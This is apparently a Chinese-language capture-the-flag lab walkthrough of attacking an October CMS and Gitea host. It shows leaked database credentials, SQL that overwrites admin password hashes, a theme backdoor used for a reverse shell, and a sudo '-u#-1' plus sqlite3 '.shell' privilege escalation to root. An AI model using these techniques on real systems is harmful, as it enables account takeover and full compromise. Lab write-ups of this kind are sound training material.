![](file-20260815095847135.png)

![](file-20260815095847137.png)

![](file-20260815095847139.png)

![](file-20260815095847140.png)

![](file-20260815095847142.png)

![](file-20260815095847145.png)

![](file-20260815095847146.png)

![](file-20260815095847148.png)

![](file-20260815095847149.png)

![](file-20260815095847151.png)

![](file-20260815095847167.png)

![](file-20260815095847170.png)

Gitea Version: 1.12.5

![](file-20260815095847171.png)

![](file-20260815095847173.png)

![](file-20260815095847175.png)

拉取到源码后进行审计：
得到数据库连接账号密码：
	october：SQ66EBYx4GT3byXH
登陆adminer.php
![](file-20260815095847176.png)

SELECT id, login, email, password, is_superuser, is_activated FROM backend_users;

![](file-20260815095847177.png)

修改密码：为admin123的bcrypt 哈希
UPDATE backend_users 
SET password = '$2a$10$99XjqE2v7rtOtHEgLUhSiOVMafVJIhOcml5mwlC7hdTYdY8xtoAd.' 
WHERE id = 1;

![](file-20260815095847178.png)

![](file-20260815095847179.png)

进入http://192.168.1.200/backend/cms/themes编写后门，htm文档不知道这么编写就去查了下官方说明文档。
![](file-20260815095847181.png)

![](file-20260815095847182.png)

先监听然后访问反弹shell解码

![](file-20260815095847183.png)

这里只是个普通权限，联想到之前有一个Gitea，查找了对应的漏洞信息，需要用户凭证，获取凭证什么的都可以去配置文件中查找，一般是ini，conf等，然后可能是备份会有个类似.bak,.back的后缀。这里就查到了app.ini.back。**还可以根据内容去网上搜索，例如这里是Gitea的默认配置文件名会告诉我们是app.ini**，使用find是name参数设置为"app.in*"这样既可以匹配app.ini也可以匹配app.ini.bak，实在没有就"\*pp.in\*"匹配前后包含pp.in。

![](file-20260815095847185.png)

获取账号密码：
gitea:UfFPTF8C8jjxVF2m

![](file-20260815095847186.png)

使用gitea登陆数据库

![](file-20260815095847187.png)

![](file-20260815095847188.png)

看看是否可以修改账户的密码，先查看数据库数据表结构

![](file-20260815095847190.png)

![](file-20260815095847205.png)
这里不能只改算法还要改加密方式和盐
UPDATE user 
SET 
    passwd = '$2a$10$.aFUpEUbVItdD0zLFpEio.UqlnV4/H.8JAkUVpyUnUq6Qai2XzZsy',
    passwd_hash_algo = 'bcrypt',
    salt = NULL
WHERE name = 'frank';

![](file-20260815095847207.png)

凭证得到了frank：123456
**这里因该是靶场作者偷懒，两个frank是不同的一个是用来denglCMS管理系统一个是登陆Gitea的**
![](file-20260815095847208.png)

	

![](file-20260815095847210.png)

![](file-20260815095847213.png)

![](file-20260815095847215.png)

![](file-20260815095847216.png)

![](file-20260815095847217.png)

提权失败

![](file-20260815095847219.png)

![](file-20260815095847220.png)

这里只需关注第一条和第三条因为用不到Dos。
这里拿出第三条

```text
Check for the user sudo permissions
sudo -l 
User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash
So user hacker can't run /bin/bash as root (!root)
User hacker sudo privilege in /etc/sudoers
意思是：用户 hacker 可以在 kali 上以任何用户身份运行 /bin/bash，但不能以 root 身份（因为 !root 的限制）。

# User privilege specification
root    ALL=(ALL:ALL) ALL
hacker ALL=(ALL,!root) /bin/bash
With ALL specified, user hacker can run the binary /bin/bash as any user
配置含义：hacker 可以以任何非 root 用户的身份执行 /bin/bash

EXPLOIT: 
sudo -u#-1 /bin/bash
Example : 
hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#
执行后，hacker 成功获得了 root 权限的 shell。

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id
and /bin/bash is executed with root permission
漏洞描述（Description）
sudo 没有检查指定的用户 ID 是否真实存在。
-u#-1 指定用户 ID 为 -1，但在 C 语言的 uid_t 类型转换中，-1 会被解释为 0（即 root 的 ID）。
因此，虽然配置写了 !root 禁止以 root 身份运行，但通过 -u#-1 绕过了这个限制，成功以 root 权限执行了 /bin/bash。
```

同理==上面是/bin/bash配置了(ALL, !root)，这道题是/usr/bin/sqlite3配置了(ALL, !root)，而且sqlite3可以低权限用户反弹shell**sqlite3 /dev/null '.shell /bin/sh'**==
```
'sudo -u#-1' :指定一个负数UID，利用漏洞将其解析为 UID=0（root权限）。
'sqlite3 /dev/null'：使用 sqlite3 打开一个虚拟数据库（在 /dev/null 中）。
'.shell /bin/bash：利用 SQLite 的 .shell 功能，启动一个 bash，从而得到 root 权限。
```

![](file-20260815095847221.png)
